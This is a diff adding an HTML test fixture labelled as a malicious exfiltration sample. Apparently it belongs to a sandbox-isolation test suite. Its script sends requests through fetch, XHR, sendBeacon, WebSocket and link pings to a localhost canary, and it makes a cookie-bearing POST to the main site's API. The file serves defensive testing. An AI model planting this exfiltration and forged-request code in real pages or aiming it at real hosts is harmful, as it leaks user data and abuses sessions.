@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="zh-Hant">
+<head>
+<meta charset="utf-8">
+<title>m01-exfil 對外送資料</title>
+</head>
+<body>
+<main><h1>m01-exfil</h1><p>malicious sample（對外送資料）</p></main>
+<script type="module">
+
+const DEF = { canaryHttp: "http://127.0.0.1:8873", canaryUdpPort: 8874, mainOrigin: "http://localhost:8871", navTarget: "http://127.0.0.1:8873/nav", mode: "real" };
+const T = Object.assign({}, DEF, (typeof window !== "undefined" && window.__pttTargets) || {});
+const C = T.canaryHttp;
+const DURATION = 10;
+const embedded = window.parent !== window;
+const mark = (k, v) => { try { document.body.dataset[k] = String(v); } catch {} };
+const render = (t) => { t = Math.max(0, Math.min(DURATION, Number(t) || 0)); try { document.body.dataset.t = String(t); } catch {} };
+addEventListener("message", (e) => { if (e.source !== window.parent) return; const m = e.data; if (!m || m.ptt !== 1 || m.type !== "seek" || typeof m.t !== "number" || !Number.isFinite(m.t)) return; render(m.t); });
+const sendReady = () => { if (embedded) { try { parent.postMessage({ ptt: 1, type: "ready", duration: DURATION }, "*"); } catch {} } };
+render(0);
+
+async function attack() {
+
+  // fetch／XHR／sendBeacon／WebSocket／<a ping>／帶 cookie 打主站 API
+  fetch(C + "/m01-fetch", { mode: "no-cors" }).then(() => mark("fetch", "sent"), (e) => mark("fetch", e.name));
+  try { const x = new XMLHttpRequest(); x.open("GET", C + "/m01-xhr"); x.send(); mark("xhr", "sent"); } catch (e) { mark("xhr", e.name); }
+  try { mark("beacon", navigator.sendBeacon(C + "/m01-beacon", "x") ? "sent" : "false"); } catch (e) { mark("beacon", e.name); }
+  try { new WebSocket(C.replace("http", "ws") + "/m01-ws"); mark("ws", "opened"); } catch (e) { mark("ws", e.name); }
+  try { fetch(T.mainOrigin + "/api/rooms", { method: "POST", credentials: "include", mode: "no-cors", headers: { "content-type": "application/json" }, body: "{}" }).then(() => mark("mainapi", "sent"), (e) => mark("mainapi", e.name)); } catch (e) { mark("mainapi", e.name); }
+  const a = document.createElement("a"); a.href = "#"; a.setAttribute("ping", C + "/m01-ping"); a.textContent = "x"; document.body.append(a); a.click();
+}
+// 使用者啟用變體：測試會以真實滑鼠點擊 iframe，觸發需要啟用的攻擊（彈窗、對話框、下載、頂層導覽、權限）再跑一次
+document.addEventListener("click", () => { attack().catch((e) => mark("attackClickError", e && e.name)); });
+attack().catch((e) => mark("attackError", e && e.name)).finally(sendReady);
+</script>
+</body>
+</html>
